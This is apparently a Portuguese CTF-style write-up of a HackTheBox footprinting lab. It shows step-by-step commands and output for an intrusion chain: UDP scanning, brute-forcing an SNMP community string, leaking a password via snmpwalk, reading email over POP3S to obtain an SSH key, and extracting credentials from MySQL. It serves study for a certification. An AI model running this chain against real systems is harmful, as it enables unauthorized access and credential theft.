# 🏴️ Footprinting Tests - Hard

> **Dificuldade:** Hard | **SO:** Linux | **Plataforma:** CPTS — Estudo de Footprinting

!!! info "Sobre esta página"
    Writeup do laboratório de footprinting (máquina hard) do HackTheBox. O servidor
    mais protegido do escopo: sem vetor óbvio no TCP, foi necessário **enumerar UDP**,
    quebrar a **community string de SNMP**, extrair credenciais e chave SSH, e
    pivotar para o **MySQL** até obter as credenciais do usuário `HTB`.

!!! note "Sobre os IPs"
    O alvo foi reiniciado durante o estudo, então o IP muda entre os blocos de
    saída (`10.129.202.20`, `10.129.62.80`). As saídas foram mantidas exatamente
    como apareceram no terminal.

---

## 📋 Informações Gerais

| Campo | Valor |
|:------|:------|
| **Hostname** | `NIXHARD` |
| **IP** | `10.129.202.20` |
| **SO** | Linux — Ubuntu (kernel 5.4.0-90-generic x86_64) |
| **Dificuldade** | Hard |
| **Plataforma / Módulo** | CPTS — Footprinting |
| **Domínio interno** | `inlanefreight.htb` |
| **Data** | 25/06/2026 |
| **Status** | Finalizado |

!!! abstract "Objetivo"
    Terceiro e último servidor do escopo, o mais protegido dos três. Exige encadear
    informações de múltiplos serviços para obter acesso. Como prova de
    comprometimento, é necessário recuperar as credenciais do usuário `HTB`.

---

## 🔍 Enumeração Inicial

### Portas e Serviços Encontrados

| Porta | Serviço | Versão / Banner |
|:------|:--------|:----------------|
| 22/tcp | ssh | OpenSSH |
| 110/tcp | pop3 | — |
| 143/tcp | imap | — |
| 993/tcp | imaps | — |
| 995/tcp | pop3s | — |
| **161/udp** | **snmp** | **net-snmp SNMPv3 server** |

### Comandos de Enumeração

```bash
# Scan TCP inicial
sudo nmap -sS -Pn -n --disable-arp-ping -D RND:5 10.129.202.20

# Sem vetor óbvio no TCP → scan UDP nas portas mais comuns
sudo nmap -sU --top-ports 20 -oN nmap-udp.txt 10.129.202.20

# Confirmação do serviço SNMP
sudo nmap -sV -sU -Pn -p161 --script snmp-info 10.129.62.80
```

### Saída Relevante (evidência)

```shell
# --- TCP ---
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

# --- UDP (NIXHARD) ---
PORT      STATE         SERVICE
161/udp   open          snmp

# --- snmp-info ---
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
```

### Descobertas

- [x] Caixa de e-mail exposta (POP3/IMAP/POP3S/IMAPS), mas **sem vetor direto** no TCP
- [x] `commonName=NIXHARD` recuperado dos certificados → hostname do alvo
- [x] **SNMP (161/udp)** aberto — o vetor que destravou a máquina, só visível no scan UDP

---

## 🎯 Técnicas Utilizadas

| # | Técnica | Onde / Como foi aplicada |
|:--|:--------|:-------------------------|
| 1 | Enumeração UDP | `nmap -sU` revela SNMP (161) após o TCP não dar vetor |
| 2 | Brute force de community string | `onesixtyone` + wordlist de discovery SNMP → community `backup` |
| 3 | Extração de informação via SNMP | `snmpwalk -c backup` vaza senha do `tom` nos argumentos de processo |
| 4 | Acesso a webmail por POP3S | `curl pop3s://` lê e-mail do `tom` contendo chave SSH privada |
| 5 | Reuso de chave SSH | Login como `tom` com a `id_rsa` exfiltrada do e-mail |
| 6 | Pivot para MySQL | `.bash_history` indica uso do MySQL → `SELECT * FROM users` → senha do `HTB` |

---

## 🚀 Exploração / Acesso Inicial

### Vetor de Entrada

| Campo | Valor |
|:------|:------|
| **Vetor** | SNMP (161/udp) → credenciais + chave SSH → MySQL |
| **Falha explorada** | Community string fraca (`backup`) expondo dados sensíveis via SNMP |
| **Ferramentas** | nmap, onesixtyone, snmpwalk, curl, ssh, mysql |
| **Acesso obtido como** | `tom` (SSH) |

### Processo

```
1. TCP sem vetor → scan UDP → SNMP (161) aberto
2. Brute force de community string com onesixtyone → "backup"
3. snmpwalk -c backup → senha do tom (NMds732Js2761) nos args de /opt/tom-recovery.sh
4. SSH direto com a senha falha → ler e-mail do tom via POP3S
5. E-mail contém id_rsa (chave SSH privada) → login como tom
6. .bash_history mostra "mysql -u tom -p" → entrar no MySQL
7. SELECT * FROM users → registro 150 → credenciais do HTB
```

---

### Etapa 1 — SNMP: brute force da community string

Sem ferramentas conhecidas para SNMP, usei o `onesixtyone` com uma wordlist de
discovery, que encontrou a community string **`backup`**:

```bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.62.80
```

![Brute force de community string SNMP com onesixtyone](img/footprinting-tests-hard/01-snmp-bruteforce.png)

### Etapa 2 — `snmpwalk`: senha do `tom` vazada

Com a community `backup`, o `snmpwalk` revelou a tabela de processos em execução,
incluindo `/opt/tom-recovery.sh` com a **senha do `tom` em texto puro** nos
argumentos:

```bash
snmpwalk -v2c -c backup 10.129.62.80
```

```shell
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
...
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
```

![snmpwalk com a community backup revela a senha do tom](img/footprinting-tests-hard/02-snmpwalk-tom-creds.png)

!!! success "Credenciais obtidas (SNMP)"
    - **Usuário:** `tom`
    - **Senha:** `NMds732Js2761`
    - **Script suspeito:** `/opt/tom-recovery.sh`

### Etapa 3 — POP3S: e-mail do `tom` com a chave SSH

!!! warning "Tentativa que NÃO funcionou"
    O login direto via **SSH** com a senha `NMds732Js2761` falhou. O acesso à
    caixa de e-mail por POP3S também encerrava a conexão ao tentar ler pela sessão
    interativa — a solução foi requisitar a mensagem diretamente com `curl`.

```bash
curl -k "pop3s://10.129.62.80/1" --user "tom:NMds732Js2761"
```

```shell
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
... (chave OpenSSH privada do tom — truncada) ...
-----END OPENSSH PRIVATE KEY-----
```

![Leitura do e-mail do tom via POP3S com a chave SSH](img/footprinting-tests-hard/03-pop3s-tom-email.png)

!!! success "Chave obtida (POP3S)"
    Chave SSH privada (`id_rsa`) do `tom`, enviada por e-mail pelo `Admin`.

---

## 🐚 Shell e Pós-Acesso

### Etapa 4 — SSH como `tom` com a chave exfiltrada

```bash
# Salvar a chave do e-mail como id_rsa
chmod 600 id_rsa
ssh -i id_rsa tom@10.129.62.80
```

![Acesso SSH como tom — leitura do .mysql_history](img/footprinting-tests-hard/04-ssh-access-tom.png)

Acesso obtido como `tom@NIXHARD`. O `.mysql_history` já indicava consultas à
tabela `users`.

### Etapa 5 — `.bash_history`: pista do MySQL

```bash
cat .bash_history
```

```shell
mysql -u tom -p
ssh-keygen -t rsa -b 4096
```

![Conteúdo do .bash_history do tom](img/footprinting-tests-hard/05-bash-history.png)

!!! tip "Pista"
    O histórico mostra que o `tom` acessa o **MySQL** localmente (`mysql -u tom -p`)
    — o próximo passo é entrar no banco reutilizando a senha do `tom`.

### Etapa 6 — MySQL: credenciais do `HTB`

```bash
mysql -u tom -p   # senha: NMds732Js2761
```

![Login bem-sucedido no MySQL como tom](img/footprinting-tests-hard/06-mysql-login-tom.png)

```sql
show databases;
use users;
SELECT * FROM users;
```

![Navegação no MySQL em busca do usuário HTB](img/footprinting-tests-hard/07-mysql-navigation.png)

![Tabela users com os registros de credenciais](img/footprinting-tests-hard/08-mysql-users-table.png)

Entre os registros, o usuário `HTB` (id `150`) com a senha-alvo:

![Credenciais do usuário HTB encontradas](img/footprinting-tests-hard/09-htb-password-found.png)

```text
150 | HTB | cr3n4o7rzse7rzhnckhssncif7ds
```

!!! success "Objetivo alcançado (tabela users — MySQL)"
    - **Usuário:** `HTB`
    - **Senha:** `cr3n4o7rzse7rzhnckhssncif7ds`

---

## 🚩 Flags

- [x] Credenciais do usuário `HTB` capturadas

| Credencial | Local |
|:-----------|:------|
| `HTB:cr3n4o7rzse7rzhnckhssncif7ds` | Tabela `users` (MySQL), registro `150` |

---

## 📖 Resumo Técnico

| Campo | Valor |
|:------|:------|
| **Causa raiz** | Community string SNMP fraca (`backup`) expondo credenciais via argumentos de processo |
| **Cadeia de ataque** | UDP/SNMP → community `backup` → senha do `tom` → e-mail POP3S → chave SSH → shell `tom` → MySQL → creds `HTB` |
| **Acesso final** | `tom` (SSH) + credenciais do `HTB` |

---

## 💡 Lições Aprendidas

- **O que funcionou:** não parar no TCP. O vetor inteiro dependia de **enumerar UDP**
  e quebrar o SNMP — sem isso a máquina parecia sem entrada.
- **O que atrasou:** insistir no SSH com a senha do `tom` (falhava) e tentar ler o
  e-mail pela sessão POP3S interativa; o caminho era `curl pop3s://.../1`.
- **Comandos para revisar depois:** `onesixtyone` para community strings,
  `snmpwalk -v2c -c <community>` para extração, `curl pop3s://` para ler e-mails.
- **Técnicas para estudar melhor:** SNMP frequentemente expõe argumentos de
  processo com senhas em texto puro; sempre revisar `~/.bash_history` e
  `~/.mysql_history` após obter shell.
